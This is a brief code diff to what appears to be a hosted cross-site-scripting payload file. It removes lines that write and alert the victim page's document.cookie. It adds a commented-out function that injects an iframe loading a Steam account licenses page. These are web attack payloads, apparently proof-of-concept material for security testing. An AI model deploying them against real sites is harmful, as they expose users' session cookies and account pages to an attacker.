@@ -1,2 +1,9 @@
-document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
-alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+/*function prepareFrame() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://store.steampowered.com/account/licenses/");
+        ifrm.style.width = "640px";
+        ifrm.style.height = "480px";
+        document.body.appendChild(ifrm);
+    }
+prepareFrame()
+alert ("finished");*/
